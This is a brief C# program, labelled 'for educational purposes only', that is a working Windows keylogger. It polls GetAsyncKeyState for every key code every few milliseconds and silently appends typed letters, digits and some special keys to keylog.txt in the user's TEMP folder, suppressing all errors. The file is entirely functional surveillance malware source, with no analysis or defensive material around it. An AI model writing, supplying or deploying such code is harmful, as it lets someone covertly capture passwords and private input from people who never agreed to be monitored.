//  For educational purposes only
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    static void Main()
    {
        string path = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "keylog.txt");

        // Open a single StreamWriter for the duration of the program
        using (StreamWriter sw = new StreamWriter(path, true))
        {
            while (true)
            {
                Thread.Sleep(10);
                for (int i = 0; i < 255; i++)
                {
                    try
                    {
                        int key = GetAsyncKeyState(i);
                        if (key == 1 || key == -32767)
                        {
                            string text = ConvertKeyCodeToString(i);
                            if (!string.IsNullOrEmpty(text))
                            {
                                sw.WriteLine(text);
                                sw.Flush(); // Ensure data is written immediately
                            }
                        }
                    }
                    catch
                    {
                        // Handle exceptions silently to avoid crashing
                    }
                }
            }
        }
    }

    private static string ConvertKeyCodeToString(int keyCode)
    {
        // Map common key codes to their string representations
        if (keyCode >= 65 && keyCode <= 90) // A-Z
        {
            return ((char)keyCode).ToString();
        }
        if (keyCode >= 48 && keyCode <= 57) // 0-9
        {
            return ((char)keyCode).ToString();
        }
        switch (keyCode)
        {
            case 32: return "Space";
            case 13: return "Enter";
            case 8: return "Backspace";
            case 9: return "Tab";
            case 27: return "Escape";
            default: return null; // Ignore unsupported keys
        }
    }
}
